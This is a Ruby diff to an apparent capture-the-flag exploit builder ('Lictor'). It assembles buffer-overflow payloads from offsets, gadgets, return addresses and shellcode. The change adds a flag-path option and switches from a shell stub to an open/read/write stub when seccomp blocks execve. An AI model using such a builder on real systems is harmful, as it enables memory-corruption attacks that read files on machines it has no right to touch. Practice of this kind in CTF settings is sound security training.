@@ -25,7 +25,7 @@ module Lictor
     # follows).
     # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
     # arch:, size:}.
-    def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil)
+    def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil, shellcode_path: nil)
       facts = Augure::Facts.parse(facts) if facts.is_a?(String)
       # The ELF check FIRST: nothing executes - statically or under the
       # debugger - until the file is a real ELF.
@@ -54,7 +54,7 @@ module Lictor
       layout = layout_for(technique, packs)
       arch = AugureProfiler.arch(binary)
       width = (arch == :x64) ? "Q<" : "L<"
-      body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file)
+      body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
       File.binwrite(out, body)
       {path: out, offset: offset, offset_source: offset_source, sink: static&.dig(:sink),
        ret: ret, ret_source: ret_source, arch: arch, size: body.bytesize}
@@ -72,7 +72,7 @@ module Lictor
     # The layout slots, resolved against the facts and the measurement.
     # Every unresolved reference is a loud error: the builder never
     # guesses a byte.
-    def assemble(facts, layout, offset, arch, width, payload_file)
+    def assemble(facts, layout, offset, arch, width, payload_file, shellcode_path = nil)
       body = +""
       ret = nil
       ret_source = nil
@@ -93,8 +93,18 @@ module Lictor
           sc = if payload_file
             File.binread(payload_file)
           else
-            AugureProfiler::Shellcode.generate(shellcode_klass(arch),
-              (slot[1] || "sh").to_sym)
+            stub = (slot[1] || "sh").to_sym
+            # the orw stub embeds its flag path: the slot's third
+            # element or the builder-level shellcode_path
+            path = ((slot.size > 2) ? slot[2] : nil) || shellcode_path
+            # seccomp: execve dies, the sh stub is a booby trap - the
+            # orw chain (open/read/write, clean exit) is the answer;
+            # the flag path defaults to the CTF convention.
+            if stub == :sh && facts["seccomp"]&.first&.first == "true"
+              stub = :orw
+              path ||= "flag.txt"
+            end
+            AugureProfiler::Shellcode.generate(shellcode_klass(arch), stub, path: path)
           end
           body << sc.b
         when "chain"
@@ -149,7 +159,8 @@ module Lictor
       when /\Aconst:(\d+)\z/
         [Regexp.last_match(1).to_i, "const:#{Regexp.last_match(1)}"]
       else
-        raise BuildError, "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | const:N)"
+        raise BuildError,
+          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | const:N)"
       end
     end
 
